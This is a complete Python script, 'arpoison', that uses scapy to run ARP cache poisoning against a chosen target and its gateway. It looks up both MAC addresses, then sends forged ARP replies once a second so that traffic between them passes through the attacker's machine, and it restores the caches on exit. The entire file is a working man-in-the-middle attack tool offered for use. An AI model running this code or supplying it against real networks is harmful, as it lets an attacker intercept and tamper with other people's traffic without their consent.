from argparse import ArgumentParser
import threading
import time
from scapy.all import *


STOP = False

def get_mac(ip):
	arp_req = ARP(pdst=ip)
	# broadcast request
	ans = srp1(Ether(dst="ff:ff:ff:ff:ff:ff") / arp_req) # returns first answer
	return ans.hwsrc

def send_arp_reply(src_ip, src_mac, dest_ip, dest_mac):
	# operation 2 = reply
	pkt = ARP(op=2, psrc=src_ip, hwsrc=src_mac, pdst=dest_ip, hwdst=dest_mac)
	print(f"ARP reply -> {dest_ip} ({dest_mac})\n\t\"{src_ip} is at {src_mac}\"")
	send(pkt, verbose=False)

def arp_thread_start():
	while not STOP:
		send_arp_reply(gateway_ip, this_mac, target_ip, target_mac)
		send_arp_reply(target_ip, this_mac, gateway_ip, gateway_mac)
		time.sleep(1)
		
def restore_cache():
	for i in range(2):
		send_arp_reply(gateway_ip, gateway_mac, target_ip, target_mac)
		send_arp_reply(target_ip, target_mac, gateway_ip, gateway_mac)
		time.sleep(1)


if __name__ == "__main__":
	# parse command line arguments
	argparser = ArgumentParser(
		prog="arpoison",
		description="ARP cache poisoning on target and gateway. Quit with Ctrl+C")
	argparser.add_argument("-t", help="target IP address", metavar="TARGET", required=True)
	argparser.add_argument("-g", help="gateway IP address", metavar="GATEWAY", required=True)
	argparser.add_argument("-gmac", help="gateway MAC address")
	argparser.add_argument("-tmac", help="target MAC address")
	argparser.add_argument("-i", help="specify network interface", metavar="IFACE" )
	args = argparser.parse_args()

	target_ip = args.t
	gateway_ip = args.g

	if not args.i: # use default interface if one isn't specified
		this_mac = get_if_hwaddr(conf.iface) 
	else:
		this_mac = get_if_hwaddr(args.i)

	# get mac addresses
	if not args.tmac: # send ARP request if not given as arg
		print("Getting MAC address of target")
		target_mac = get_mac(target_ip)
	else:
		target_mac = args.tmac
	if not args.gmac:
		print("Getting MAC address of gateway")
		gateway_mac = get_mac(gateway_ip)
	else:
		gateway_mac = args.gmac

	# start thread
	print("Poisoning caches...")
	arp_thread = threading.Thread(target=arp_thread_start)
	arp_thread.start()

	# Wait for Ctrl+C
	try:
		while True:
			time.sleep(10)
	except KeyboardInterrupt:
		print("\t[Ctrl+C pressed]")
		STOP = True
		arp_thread.join()
		print("\nRestoring caches...")
		restore_cache()
